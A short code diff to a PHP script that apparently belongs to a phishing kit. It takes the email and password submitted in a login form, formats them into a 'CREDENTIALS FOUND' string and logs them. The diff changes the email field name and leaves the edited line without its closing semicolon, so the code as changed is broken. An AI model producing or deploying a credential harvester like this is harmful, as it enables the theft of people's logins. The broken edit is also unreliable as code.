@@ -1,5 +1,5 @@
 <?php
-$username = $_POST['Email'];
+$username = $_POST['email']
 $password = $_POST['password'];
 $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
